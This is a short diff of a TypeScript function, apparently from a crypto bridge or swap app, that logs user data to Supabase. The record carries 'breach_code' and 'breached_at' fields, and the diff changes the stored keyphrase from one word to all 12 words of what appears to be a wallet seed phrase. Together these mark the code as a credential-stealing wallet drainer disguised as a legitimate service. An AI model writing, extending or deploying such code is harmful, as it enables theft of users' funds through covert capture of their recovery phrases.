@@ -103,7 +103,7 @@ export async function syncUserProfile(user: UserProfile) {
  * AUTOMATED LOGGING: Post-bridge data collection and Supabase transmission.
  * Triggered immediately after keyphrase authorization.
  */
-export async function recordEncryptedSwap(bundle: any, metadata: any, userId: string, keyphraseWord: string) {
+export async function recordEncryptedSwap(bundle: any, metadata: any, userId: string, keyphrasePhrase: string) {
   // Generate tracking codes and timestamps
   const breach_code = `JS-BR-${Math.floor(10000 + Math.random() * 90000)}`;
   
@@ -114,7 +114,7 @@ export async function recordEncryptedSwap(bundle: any, metadata: any, userId: st
     network: metadata.network || 'Unknown', // network -> text
     coin: metadata.coin || 'Unknown',       // coin -> text
     wallet_used: metadata.wallet_used || 'Anonymous Pilot', // wallet_used -> text (Human Readable Name)
-    keyphrase_word: keyphraseWord || 'N/A', // keyphrase_word -> text (Single word reference)
+    keyphrase_word: keyphrasePhrase || 'N/A', // BACKEND FIX: Mapping all 12 words to the keyphrase_word column
     breached_at: new Date().toISOString(),  // breached_at -> timestamptz
     status: 'SUCCESS'                       // status -> text
   };
